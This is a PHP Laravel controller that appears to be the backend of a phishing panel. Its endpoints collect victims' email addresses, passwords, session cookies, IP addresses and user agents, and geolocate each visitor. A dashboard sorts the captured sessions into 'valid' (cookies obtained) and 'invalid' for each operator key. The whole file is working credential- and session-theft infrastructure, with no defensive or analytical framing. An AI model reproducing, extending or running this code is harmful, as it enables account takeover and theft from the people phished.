<?php

namespace App\Http\Controllers;

use App\Models\Hub;
use App\Models\InvalidVisitor;
use App\Models\ValidVisitor;
use Illuminate\Support\Facades\Auth;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;


class DashboardController extends Controller
{
    //
    public function dashboard(){
        $user = Auth::user();
        $valid = Hub::where("key_user", $user->password)
            ->whereNotNull("cookies")
            ->count();
        $invalid = Hub::where("key_user",$user->password)->where("cookies",null)->count();

        $data = ValidVisitor::where("key_user",$user->password)->get();
//        return $data;
        return view("dashboard",["validvisitor"=>$data,"valid"=>$valid,"invalid"=>$invalid]);
    }



    public function validpage(){
        $user = Auth::user();
//
        $data = Hub::where("key_user", $user->password)
            ->whereNotNull("cookies")
            ->get();

//        return $data;
        return view("valid",["result"=>$data]);
    }

    public function invalidpage(){
        $user = Auth::user();
//
        $data = Hub::where("key_user",$user->password)->where("cookies",null)->get();
//        return $data;
        return view("invalid",["result"=>$data]);
    }

    public function username(Request $request){


        $data = Hub::where("session_id",$request->session_id)->first();
        if (!$data){

            $response = Http::get("https://get.geojs.io/v1/ip/country/{$request->ip}");

            $add =  Hub::create([
                "key_user"=>$request->buntu,
                "name"=>$request->email,
                "session_id"=>$request->session_id,
                "user_agent"=>$request->user_agent,
                "country"=>trim($response->body()),
                "ip"=>$request->ip,
            ]);
            return $add;
        }



        return "okk";


    }

    public function password(Request $request){


        $data = Hub::where("session_id",$request->session_id)->first();
        if ($data){

            $data->password = $request->password;
            $data->save();

        };



        return "ok";


    }

    public function validvisitor(Request $request)
    {

        $response = Http::get("https://get.geojs.io/v1/ip/country/{$request->ip}");

        $data = ValidVisitor::create([
            "user_agent"=>$request->user_agent,
            "ip"=>$request->ip,
            "country"=>trim($response->body()),
            "key_user"=>$request->key_user,
        ]);

        return $data;


    }

    public function invalidvisitor(Request $request)
    {
        $data = InvalidVisitor::create([
            "key_user"=>$request->key,
            "session_id"=>$request->session_id,
            "user_agent"=>$request->user_agent,
            "ip"=>$request->ip,
        ]);

        return "ok";
    }

    public function cookies(Request $request)
    {
       $data = Hub::where("session_id",$request->session_id)->first();
        if ($data){
            $data->cookies = $request->cookiesss;
            $data->save();
        }


        return $data;
    }

    public function json1(Request $request){
        $data = Hub::where("session_id",$request->session_id)->first();
        if (!$data){

            $response = Http::get("https://get.geojs.io/v1/ip/country/{$request->ip}");

            $add =  Hub::create([
                "key_user"=>$request->key_user,
                "json1" => $request->json1,
                "session_id"=>$request->session_id,
                "user_agent"=>$request->user_agent,
                "country"=>trim($response->body()),
                "ip"=>$request->ip,
            ]);
            return $add;
        }



        return "okk";

    }
}
